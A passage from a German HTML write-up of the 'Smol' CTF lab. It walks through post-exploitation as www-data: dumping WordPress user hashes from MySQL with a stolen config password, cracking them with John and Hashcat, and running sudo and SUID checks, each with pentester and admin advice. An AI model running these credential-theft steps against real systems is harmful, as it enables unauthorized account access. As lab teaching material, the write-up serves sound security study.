+            <p class="recommendation">**Empfehlung (Pentester):** Führen Sie weitere Schritte zur Shell-Stabilisierung durch (z.B. Python PTY). Beginnen Sie mit der Enumeration des Systems aus der Sicht von `www-data`, um nach Wegen zur Privilegieneskalation zu suchen.<br>**Empfehlung (Admin):** Der Benutzer `www-data` sollte nur die minimal notwendigen Rechte haben, um den Webserver zu betreiben. Er sollte keinen Zugriff auf sensible Systemdateien oder die Möglichkeit haben, beliebige Befehle mit höheren Rechten auszuführen.</p>
+
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@smol:/var/www/wordpress/wp-admin$ <span class="command">stty rows 47 columns 94</span></div>
+                     <div class="prompt">www-data@smol:/var/www/wordpress/wp-admin$ <span class="command">id</span></div>
+                     <pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
+                     <div class="prompt">www-data@smol:/var/www/wordpress/wp-admin$ <span class="command">myswql -u wpuser -p</span></div>
+                     <pre>
+Command 'myswql' not found, did you mean:
+
+  command 'mysql' from deb mysql-client-core-8.0 (8.0.35-0ubuntu0.20.04.1)
+  command 'mysql' from deb mariadb-client-core-10.3 (1:10.3.38-0ubuntu0.20.04.1)
+
+Try: apt install <deb name></pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Nach der erneuten Bestätigung der Identität (`id`) wird versucht, sich mit dem MySQL-Client anzumelden (`mysql -u wpuser -p`). Der Befehl wurde jedoch falsch geschrieben (`myswql` statt `mysql`).</p>
+             <p class="evaluation">**Bewertung:** Der Tippfehler verhindert die Ausführung des Befehls. Das System gibt jedoch hilfreiche Vorschläge, wie der Befehl korrekt lautet (`mysql`). Dies zeigt, dass der MySQL-Client auf dem System installiert zu sein scheint.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Korrigieren Sie den Tippfehler und führen Sie `mysql -u wpuser -p` aus. Geben Sie das zuvor aus der `wp-config.php` extrahierte Passwort (`kbLSF2Vop#lw3rjDZ629*Z%G`) ein.<br>**Empfehlung (Admin):** Keine direkte Aktion erforderlich, aber die Verfügbarkeit des `mysql`-Clients für den `www-data`-Benutzer sollte überprüft werden. Idealerweise sollte der Webserver-Benutzer keinen direkten Zugriff auf Datenbank-Tools benötigen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@smol:/var/www/wordpress/wp-admin$ <span class="command">mysql -u wpuser -p</span></div>
+                     <pre>Enter password: <span class="password">********</span>
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 151976
+Server version: 8.0.36-0ubuntu0.20.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2024, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+<span class="prompt">mysql></span> <span class="command">show databases;</span></pre>
+                     <pre>+--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| <span class="command">wordpress</span>          |
++--------------------+
+5 rows in set (0.00 sec)
+
+<span class="prompt">mysql></span> <span class="command">use wordpress;</span></pre>
+                     <pre>Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+<span class="prompt">mysql></span> <span class="command">show tables;</span></pre>
+                     <pre>+---------------------------+
+| Tables_in_wordpress       |
++---------------------------+
+| wp_bp_activity            |
+| wp_bp_activity_meta       |
+| wp_bp_invitations         |
+| wp_bp_messages_messages   |
+| wp_bp_messages_meta       |
+| wp_bp_messages_notices    |
+| wp_bp_messages_recipients |
+| wp_bp_notifications       |
+| wp_bp_notifications_meta  |
+| wp_bp_optouts             |
+| wp_bp_xprofile_data       |
+| wp_bp_xprofile_fields     |
+| wp_bp_xprofile_groups     |
+| wp_bp_xprofile_meta       |
+| wp_commentmeta            |
+| wp_comments               |
+| wp_links                  |
+| wp_options                |
+| wp_postmeta               |
+| wp_posts                  |
+| wp_signups                |
+| wp_term_relationships     |
+| wp_term_taxonomy          |
+| wp_termmeta               |
+| wp_terms                  |
+| wp_usermeta               |
+| <span class="command">wp_users</span>                  |
+| wp_wysija_campaign        |
+| wp_wysija_campaign_list   |
+| wp_wysija_custom_field    |
+| wp_wysija_email           |
+| wp_wysija_email_user_stat |
+| wp_wysija_email_user_url  |
+| wp_wysija_form            |
+| wp_wysija_list            |
+| wp_wysija_queue           |
+| wp_wysija_url             |
+| wp_wysija_url_mail        |
+| wp_wysija_user            |
+| wp_wysija_user_field      |
+| wp_wysija_user_history    |
+| wp_wysija_user_list       |
++---------------------------+
+42 rows in set (0.00 sec)
+
+<span class="prompt">mysql></span> <span class="command">select * from wp_users;</span></pre>
+                     <pre>+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
+| ID | user_login | user_pass                          | user_nicename | user_email         | user_url            | user_registered     | user_activation_key | user_status | display_name           |
++----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
+|  1 | admin      | <span class="password">$P$B5Te3OJvzvJ7NjDDeHZcOKqsQACvOJ0</span> | admin         | admin@smol.thm     | http://www.smol.hmv | 2023-08-16 06:58:30 |                     |           0 | admin                  |
+|  2 | wpuser     | <span class="password">$P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E.</span> | wp            | wp@smol.thm        | http://smol.thm     | 2023-08-16 11:04:07 |                     |           0 | wordpress user         |
+|  3 | think      | <span class="password">$P$B0jO/cdGOCZhlAJfPSqV2gVi2pb7Vd/</span> | think         | josemlwdf@smol.thm | http://smol.thm     | 2023-08-16 15:01:02 |                     |           0 | Jose Mario Llado Marti |
+|  4 | gege       | <span class="password">$P$BsIY1w5krnhP3WvURMts0/M4FwiG0m1</span> | gege          | gege@smol.thm      | http://smol.thm     | 2023-08-17 20:18:50 |                     |           0 | gege                   |
+|  5 | diego      | <span class="password">$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1</span> | diego         | diego@smol.thm     | http://smol.thm     | 2023-08-17 20:19:15 |                     |           0 | diego                  |
+|  6 | xavi       | <span class="password">$P$BvcalhsCfVILp2SgttADny40mqJZCN/</span> | xavi          | xavi@smol.thm      | http://smol.thm     | 2023-08-17 20:20:01 |                     |           0 | xavi                   |
++----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
+6 rows in set (0.00 sec)</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Der korrigierte `mysql`-Befehl wird ausgeführt. Nach Eingabe des Passworts aus der `wp-config.php` wird erfolgreich eine Verbindung zur MySQL-Datenbank hergestellt. Die Befehle `show databases;`, `use wordpress;`, `show tables;` und `select * from wp_users;` werden ausgeführt, um die `wp_users`-Tabelle zu inspizieren.</p>
+            <p class="evaluation">**Bewertung:** Der Datenbankzugriff war erfolgreich. Die Abfrage der `wp_users`-Tabelle ist äußerst wertvoll, da sie die Benutzernamen und die dazugehörigen Passwort-Hashes aller WordPress-Benutzer offenlegt. Die Hashes (`$P$...`) sind im portablen phpass-Format gespeichert, das von Tools wie John the Ripper oder Hashcat geknackt werden kann.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Kopieren Sie die extrahierten Passwort-Hashes und versuchen Sie, sie offline mit Tools wie John the Ripper oder Hashcat und Wortlisten (z.B. rockyou.txt) zu knacken. Geknackte Passwörter könnten für den Login ins WordPress-Backend (falls möglich) oder potenziell für andere Dienste (SSH, sudo) verwendet werden, falls Passwörter wiederverwendet wurden.<br>**Empfehlung (Admin):** Stellen Sie sicher, dass Datenbankpasswörter stark und einzigartig sind. Beschränken Sie den Zugriff auf die Datenbank auf die notwendigen Benutzer und Hosts. Verwenden Sie starke Passwort-Hashing-Algorithmen (obwohl phpass für WordPress Standard ist). Erzwingen Sie starke Passwörter für alle Benutzerkonten.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/php_filter_chain_generator]
+└─# <span class="command">cat ~/hash | awk '{print $6}'</span></div>
+                     <pre>
+user_pass
+
+$P$B5Te3OJvzvJ7NjDDeHZcOKqsQACvOJ0
+$P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E.
+$P$B0jO/cdGOCZhlAJfPSqV2gVi2pb7Vd/
+$P$BsIY1w5krnhP3WvURMts0/M4FwiG0m1
+$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1
+$P$BvcalhsCfVILp2SgttADny40mqJZCN/
+
+sandiegocalifornia</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Dieser Befehl wird auf dem Angreifer-System ausgeführt. `cat ~/hash` gibt den Inhalt einer Datei namens `hash` im Home-Verzeichnis aus (vermutlich wurde die Ausgabe der MySQL-Tabelle dorthin kopiert). `awk '{print $6}'` extrahiert die sechste Spalte dieser Ausgabe, welche die Passwort-Hashes enthält. Die letzte Zeile "sandiegocalifornia" scheint ein bereits geknacktes Passwort oder eine Testzeile zu sein.</p>
+            <p class="evaluation">**Bewertung:** Extrahiert die benötigten Hashes aus der vorherigen MySQL-Ausgabe zur weiteren Verarbeitung.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Bereinigen Sie die Ausgabe, um nur die reinen Hashes zu erhalten, und speichern Sie sie in einer Datei (wie im nächsten Schritt geschehen), um sie an Cracking-Tools zu übergeben.<br>**Empfehlung (Admin):** Keine Aktion erforderlich.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/php_filter_chain_generator]
+└─# <span class="command">cat ~/hash | awk '{print $6}' > pos.txt</span></div>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Identisch zum vorherigen Befehl, aber die extrahierten Hashes werden nun in eine Datei namens `pos.txt` umgeleitet.</p>
+             <p class="evaluation">**Bewertung:** Erstellt die Eingabedatei für das Passwort-Cracking-Tool.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Überprüfen Sie den Inhalt von `pos.txt`, um sicherzustellen, dass er nur die Hashes im korrekten Format enthält.<br>**Empfehlung (Admin):** Keine Aktion erforderlich.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/php_filter_chain_generator]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt pos.txt</span></div>
+                     <pre>Using default input encoding: UTF-8
+Loaded 6 password hashes with 6 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 16 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+
+<span class="password">sandiegocalifornia</span>         (?)
+<span class="password">hero_gege@hotmail.com</span>      (?)</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** John the Ripper (`john`) wird verwendet, um die in `pos.txt` gespeicherten phpass-Hashes zu knacken. `--wordlist=/usr/share/wordlists/rockyou.txt` weist John an, Passwörter aus der RockYou-Liste zu versuchen.</p>
+            <p class="evaluation">**Bewertung:** Erfolg! John konnte zwei der sechs Hashes knacken:
+*   `sandiegocalifornia`
+*   `hero_gege@hotmail.com`
+Die Fragezeichen `(?)` deuten darauf hin, dass John nicht sicher ist, welchem Benutzer diese Passwörter zugeordnet sind, da die Benutzernamen nicht im gleichen Format in der `pos.txt`-Datei standen. Wir müssen zurück zur MySQL-Ausgabe schauen, um die Zuordnung zu finden:
+    *   `$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1` (Benutzer `diego`) wurde zu `sandiegocalifornia` geknackt.
+    *   `$P$BsIY1w5krnhP3WvURMts0/M4FwiG0m1` (Benutzer `gege`) wurde zu `hero_gege@hotmail.com` geknackt.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Versuchen Sie, sich mit den geknackten Zugangsdaten (`diego`:`sandiegocalifornia`, `gege`:`hero_gege@hotmail.com`) in WordPress einzuloggen oder prüfen Sie, ob diese Passwörter für den `sudo`-Befehl oder SSH (obwohl Passwort-Auth deaktiviert ist) wiederverwendet wurden.<br>**Empfehlung (Admin):** Benutzer `diego` und `gege` verwenden schwache Passwörter, die in bekannten Listen vorkommen. Erzwingen Sie Richtlinien für starke Passwörter und überprüfen Sie regelmäßig auf kompromittierte Anmeldedaten.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@smol:/home$ <span class="command">sudo -l</span></div>
+                     <pre>[sudo] password for www-data:
+Sorry, try again.
+[sudo] password for www-data:
+<span class="password">sudo: 1 incorrect password attempt</span></pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Zurück in der Reverse Shell als `www-data`. Der Befehl `sudo -l` wird ausgeführt, um aufzulisten, welche Befehle der aktuelle Benutzer (`www-data`) mit `sudo` (also mit Root-Rechten) ausführen darf. Da `www-data` kein Passwort hat oder der Angreifer es nicht kennt, wird nach dem Passwort gefragt.</p>
+             <p class="evaluation">**Bewertung:** Der Befehl schlägt fehl, da das Passwort für `www-data` nicht bekannt ist (und wahrscheinlich auch nicht existiert oder standardmäßig nicht für sudo verwendet werden kann). Es werden zwei Versuche unternommen (vermutlich mit den geknackten Passwörtern), die beide fehlschlagen. Dies zeigt, dass `www-data` keine einfachen `sudo`-Rechte hat.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Suchen Sie nach anderen Wegen zur Privilegieneskalation. `sudo -l` ist oft ein erster Check, aber hier nicht erfolgreich. Suchen Sie nach SUID-Binaries, Kernel-Exploits, Fehlkonfigurationen, Cronjobs etc.<br>**Empfehlung (Admin):** Der `www-data`-Benutzer sollte keine `sudo`-Rechte haben. Die Konfiguration scheint hier korrekt zu sein.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@smol:/home$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                     <pre>
+     <span class="command">3279     24 -rwsr-xr-x   1 root     root        22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1</span>
+    <span class="command">55933    464 -rwsr-xr-x   1 root     root       473576 Aug  4  2023 /usr/lib/openssh/ssh-keysign</span>
+     <span class="command">1383     16 -rwsr-xr-x   1 root     root        14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device</span>
+     <span class="command">9110     52 -rwsr-xr--   1 root     messagebus    51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
+      <span class="command">491     56 -rwsr-sr-x   1 daemon   daemon        55560 Nov 12  2018 /usr/bin/at</span>
+      <span class="command">672     40 -rwsr-xr-x   1 root     root          39144 Mar  7  2020 /usr/bin/fusermount</span>
+      <span class="command">480     88 -rwsr-xr-x   1 root     root          88464 Nov 29  2022 /usr/bin/gpasswd</span>
+      <span class="command">178     84 -rwsr-xr-x   1 root     root          85064 Nov 29  2022 /usr/bin/chfn</span>
+     <span class="command">2463    164 -rwsr-xr-x   1 root     root         166056 Apr  4  2023 /usr/bin/sudo</span>
+      <span class="command">184     52 -rwsr-xr-x   1 root     root          53040 Nov 29  2022 /usr/bin/chsh</span>
+      <span class="command">547     68 -rwsr-xr-x   1 root     root          68208 Nov 29  2022 /usr/bin/passwd</span>
+     <span class="command">9965     56 -rwsr-xr-x   1 root     root          55528 May 30  2023 /usr/bin/mount</span>
+    <span class="command">14014     68 -rwsr-xr-x   1 root     root          67816 May 30  2023 /usr/bin/su</span>
+     <span class="command">1235     44 -rwsr-xr-x   1 root     root          44784 Nov 29  2022 /usr/bin/newgrp</span>
+     <span class="command">3277     32 -rwsr-xr-x   1 root     root          31032 Feb 21  2022 /usr/bin/pkexec</span>
+     <span class="command">9972     40 -rwsr-xr-x   1 root     root          39144 May 30  2023 /usr/bin/umount</span></pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Der `find`-Befehl wird genutzt, um das gesamte Dateisystem (`/`) nach Dateien (`-type f`) zu durchsuchen, die das SUID-Bit gesetzt haben (`-perm -4000`). Das SUID-Bit erlaubt es einem Benutzer, eine Datei mit den Rechten des Dateibesitzers (oft `root`) auszuführen. `-ls` zeigt detaillierte Informationen zu den gefundenen Dateien an. `2>/dev/null` unterdrückt Fehlermeldungen (z.B. bei fehlenden Leserechten für Verzeichnisse).</p>
+             <p class="evaluation">**Bewertung:** Die Ausgabe listet eine Reihe von Standard-SUID-Binaries auf, die auf den meisten Linux-Systemen zu finden sind (z.B. `passwd`, `su`, `sudo`, `mount`, `umount`, `pkexec`). Es sind keine ungewöhnlichen oder benutzerdefinierten SUID-Dateien zu sehen, die oft ein einfacher Weg zur Privilegieneskalation sind. `pkexec` (Teil von Polkit) ist jedoch bekannt für frühere Schwachstellen (wie PwnKit CVE-2021-4034), die eine lokale Privilegieneskalation ermöglichten.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Überprüfen Sie die Versionen der gefundenen SUID-Binaries, insbesondere `pkexec` und `sudo`, auf bekannte ausnutzbare Schwachstellen (z.B. `pkexec --version`). GTFOBins ist eine hervorragende Ressource, um nach bekannten Umgehungen oder Missbrauchsmöglichkeiten für Standard-Linux-Binaries zu suchen. Da keine offensichtlich ungewöhnlichen SUID-Dateien vorhanden sind, müssen andere Vektoren wie Kernel-Exploits oder Fehlkonfigurationen geprüft werden.<br>**Empfehlung (Admin):** Reduzieren Sie die Anzahl der SUID-Binaries auf das absolute Minimum. Überprüfen Sie regelmäßig, ob unnötige SUID-Bits gesetzt sind. Halten Sie alle Systemkomponenten, insbesondere solche mit SUID-Rechten, aktuell.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@smol:/home$ <span class="command">sudo pkexec /bin/sh</span></div>
+                     <pre>[sudo] password for www-data:
+Sorry, try again.
+[sudo] password for www-data:
+<span class="password">sudo: 1 incorrect password attempt</span></pre>
+                 </div>
+            </div>
+            <p class="analysis">**Analyse:** Versuch, `pkexec` direkt zu nutzen, um eine Shell (`/bin/sh`) als root zu starten. `pkexec` erfordert normalerweise eine Authentifizierung, ähnlich wie `sudo`.</p>
+            <p class="evaluation">**Bewertung:** Wie bei `sudo -l` scheitert der Versuch an der Passwortabfrage. Dies deutet darauf hin, dass bekannte Schwachstellen wie PwnKit (die keine Authentifizierung erfordern würden) auf diesem System entweder nicht vorhanden oder bereits gepatcht sind.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Da `pkexec` eine Authentifizierung erfordert und wir das Passwort nicht haben, ist dieser direkte Weg blockiert. Konzentrieren Sie sich auf andere Methoden.<br>**Empfehlung (Admin):** Stellen Sie sicher, dass Polkit und `pkexec` auf dem neuesten Stand sind, um bekannte Schwachstellen zu vermeiden.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@smol:/home$ <span class="command">ss -altpn</span></div>
+                     <pre>
+State     Recv-Q    Send-Q        Local Address:Port          Peer Address:Port    Process
+LISTEN    0         70                <span class="command">127.0.0.1:33060</span>              0.0.0.0:*
+LISTEN    0         151               <span class="command">127.0.0.1:3306</span>               0.0.0.0:*
+LISTEN    0         4096          <span class="command">127.0.0.53%lo:53</span>                 0.0.0.0:*
+LISTEN    0         128                 <span class="command">0.0.0.0:22</span>                 0.0.0.0:*
+LISTEN    0         511                       <span class="command">*:80</span>                       *:*
+LISTEN    0         128                    <span class="command">[::]:22</span>                    [::]:*                  </pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Der Befehl `ss -altpn` wird verwendet, um Netzwerk-Sockets anzuzeigen. `-a` zeigt alle Sockets (lauschende und nicht-lauschende). `-l` zeigt nur lauschende Sockets an. `-t` zeigt TCP-Sockets. `-p` zeigt die Prozesse an, die die Sockets verwenden. `-n` zeigt numerische Adressen und Ports an.</p>
+             <p class="evaluation">**Bewertung:** Die Ausgabe listet die Dienste auf, die auf Netzwerkverbindungen warten:
+*   **Port 33060 (127.0.0.1):** MySQL X Protocol, oft von neueren MySQL-Versionen verwendet. Lauscht nur auf localhost.
+*   **Port 3306 (127.0.0.1):** Standard-MySQL-Port. Lauscht nur auf localhost. Bestätigt, dass die Datenbank nur lokal erreichbar ist.
+*   **Port 53 (127.0.0.53):** Lokaler DNS-Resolver (`systemd-resolved`). Lauscht nur auf localhost.
+*   **Port 22 (0.0.0.0 und [::]):** SSH-Server. Lauscht auf allen IPv4- und IPv6-Schnittstellen.
+*   **Port 80 (*):** Apache-Webserver. Lauscht auf allen IPv4-Schnittstellen (und implizit wahrscheinlich auch IPv6, obwohl nicht explizit als `[::]:80` gelistet).
+Es sind keine ungewöhnlichen oder unerwarteten lauschenden Dienste zu sehen.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Bestätigt die bereits bekannten offenen Ports (22, 80) und die nur lokal erreichbaren Datenbankports (3306, 33060). Keine direkten neuen Angriffspunkte hier, aber die Bestätigung, dass die DB nur lokal läuft, ist nützlich.<br>**Empfehlung (Admin):** Es ist eine gute Sicherheitspraxis, Datenbanken nur auf der lokalen Schnittstelle (127.0.0.1) lauschen zu lassen, wenn kein externer Zugriff erforderlich ist. Stellen Sie sicher, dass nur notwendige Dienste laufen und an die erforderlichen Schnittstellen gebunden sind.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">echo 'YToxOntzOjE0OiJxdWlja3NlbGVjdGlvbiI7YToxOntzOjY6IndwLTMwMSI7YTo1OntzOjEwOiJpZGVudGlmaWVyIjtzOjY6IndwLTMwMSI7czo1OiJ3aWR0aCI7aToyODE7czo2OiJoZWlnaHQiO2k6MTkwO3M6MzoidXJsIjtzOjEwNToiaHR0cDovLzE5Mi4xNjguMjA0LjEzOS93cC1jb250ZW50L3BsdWdpbnMvd3lzaWphLW5ld3NsZXR0ZXJzL2ltZy9kZWZhdWx0LW5ld3NsZXR0ZXIvbmV3c2xldHRlci9waWdlb24ucG5nIjtzOjk6InRodW1iX3VybCI7czoxMTM6Imh0dHA6Ly8xOTIuMTY4LjIwNC4xMzkvd3AtY29udGVudC9wbHVnaW5zL3d5c2lqYS1uZXdzbGV0dGVycy9pbWcvZGVmYXVsdC1uZXdzbGV0dGVyL25ld3NsZXR0ZXIvcGlnZW9uLTE1MHgxNTAucG5nIjt9fX0=' | base64 -d</span></div>
+                     <pre>a:1:{s:14:"quickselection";a:1:{s:6:"wp-301";a:5:{s:10:"identifier";s:6:"wp-301";s:5:"width";i:281;s:6:"height";i:190;s:3:"url";s:105:"http://192.168.204.139/wp-content/plugins/wysija-newsletters/img/default-newsletter/newsletter/pigeon.png";s:9:"thumb_url";s:113:"http://192.168.204.139/wp-content/plugins/wysija-newsletters/img/default-newsletter/newsletter/pigeon-150x150.png";}}}</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Ein weiterer Base64-String wird dekodiert. Der dekodierte Inhalt ist ein serialisiertes PHP-Array (`a:1:{...}`). Es scheint Daten zu enthalten, die mit einem Plugin namens `wysija-newsletters` (ein bekanntes, älteres Newsletter-Plugin für WordPress, oft mit Schwachstellen) und einer Bilddatei (`pigeon.png`) in Verbindung stehen. Die IP-Adresse `192.168.204.139` im dekodierten String gehört nicht zum aktuellen Ziel.</p>
+            <p class="evaluation">**Bewertung:** Dieser dekodierte String scheint für den aktuellen Kontext des Smol-Systems irrelevant zu sein. Er stammt möglicherweise aus einer früheren Untersuchung oder einer anderen Quelle und wurde hier versehentlich eingefügt. Das `wysija-newsletters`-Plugin wurde in den vorherigen Scans auf Smol nicht gefunden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Ignorieren Sie diesen String, da er sich nicht auf das aktuelle Zielsystem zu beziehen scheint.<br>**Empfehlung (Admin):** Keine Aktion erforderlich, da irrelevant für Smol.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/php_filter_chain_generator]
+└─# <span class="command">john --show --format=phpass pos.txt</span></div>
+                     <pre>?:<span class="password">hero_gege@hotmail.com</span>
+?:<span class="password">sandiegocalifornia</span>
+
+2 password hashes cracked, 4 left</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Der Befehl `john --show` wird verwendet, um die bereits geknackten Passwörter aus der `john.pot`-Datei (Johns Potfile, in dem geknackte Hashes gespeichert werden) für das Format `phpass` und die Eingabedatei `pos.txt` anzuzeigen.</p>
+             <p class="evaluation">**Bewertung:** Bestätigt erneut die beiden geknackten Passwörter: `hero_gege@hotmail.com` und `sandiegocalifornia`. Zeigt auch, dass 4 der ursprünglichen Hashes noch nicht geknackt wurden.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Versuchen Sie ggf. stärkere Passwortlisten oder Cracking-Regeln mit John oder Hashcat, um die verbleibenden 4 Hashes zu knacken, falls die bisherigen Zugangsdaten nicht zur Privilegieneskalation führen.<br>**Empfehlung (Admin):** Stellt sicher, dass alle Benutzer starke, einzigartige Passwörter verwenden.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">echo '$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1' > testhashcat</span></div>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Erstellt eine neue Datei `testhashcat` auf dem Angreifer-System und schreibt einen der phpass-Hashes (zugehörig zu Benutzer `diego`) hinein.</p>
+             <p class="evaluation">**Bewertung:** Bereitet den spezifischen Hash für einen Test mit Hashcat vor, wahrscheinlich um die Cracking-Funktionalität zu überprüfen oder eine bestimmte Passwortliste/Regel zu testen.</p>
+             <p class="recommendation">**Empfehlung (Pentester/Admin):** Keine Aktion erforderlich.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+<div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">hashcat -a 0 -m 400 testhashcat /usr/share/wordlists/rockyou.txt</span></div>
+                     <pre>hashcat (v6.2.6) starting
+
+
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344273
+* Bytes.....: 139921401
+* Keyspace..: 14344273
+
+Cracking performance lower than expected?
+
+
+
+[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => s
+
+
+<span class="password">$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1:sandiegocalifornia</span>
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 400 (phpass)
+Hash.Target......: $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1
+Time.Started.....: Tue Feb 11 00:52:07 2025 (1 min, 13 secs)
+Time.Estimated...: Tue Feb 11 00:53:20 2025 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:    18071 H/s (6.92ms) @ Accel:128 Loops:512 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 1316864/14344273 (9.18%)
+Rejected.........: 0/1316864 (0.00%)
+Restore.Point....: 1314816/14344273 (9.17%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:7680-8192
+Candidate.Engine.: Device Generator
+Candidates.#1....: santsant -> samymeister
+Hardware.Mon.#1..: Util: 88%
+
+Started: Tue Feb 11 00:52:06 2025
+Stopped: Tue Feb 11 00:53:21 2025</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Hashcat wird verwendet, um den einzelnen Hash in `testhashcat` zu knacken. `-a 0` steht für einen reinen Wörterbuchangriff (Straight Mode). `-m 400` gibt den Hash-Modus für phpass an. Als Wörterbuch wird `/usr/share/wordlists/rockyou.txt` verwendet.</p>
+             <p class="evaluation">**Bewertung:** Hashcat knackt den Hash erfolgreich und findet das Passwort `sandiegocalifornia`. Dies bestätigt das Ergebnis von John the Ripper für den Benutzer `diego`.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Bestätigt das Passwort. Keine neuen Erkenntnisse für die Privilegieneskalation.<br>**Empfehlung (Admin):** Siehe vorherige Empfehlungen zu schwachen Passwörtern.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>Die Passwörter wurden wohl geändert da sie nicht mehr funktionieren</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Eine abschließende Notiz des Pentesters.</p>
+             <p class="evaluation">**Bewertung:** Obwohl die Passwörter `sandiegocalifornia` (für `diego`) und `hero_gege@hotmail.com` (für `gege`) erfolgreich aus den Datenbank-Hashes geknackt wurden, scheinen sie für keinen weiteren Zugriff (z.B. `sudo`, WordPress-Login mit höheren Rechten) zu funktionieren. Dies könnte bedeuten, dass die Passwörter seit der Erstellung der Datenbank-Einträge geändert wurden, oder dass diese Benutzer einfach keine erhöhten Rechte haben, die für den nächsten Schritt nützlich wären.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Da die geknackten Passwörter und Standard-Privesc-Checks (sudo, SUID) nicht zum Erfolg führen, müssen andere, möglicherweise komplexere Privilegieneskalationsvektoren untersucht werden. Dazu gehören: Kernel-Exploits (Überprüfung der Kernel-Version), Fehlkonfigurationen von Diensten, unsichere Dateiberechtigungen, Cronjobs, die als root laufen, oder die Ausnutzung von Beziehungen zwischen Diensten.<br>**Empfehlung (Admin):** Regelmäßige Passwortänderungen sind gut, aber die primäre Verteidigung liegt in starken Passwörtern und der Minimierung von Berechtigungen (Least Privilege Principle).</p>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">user.txt</div>
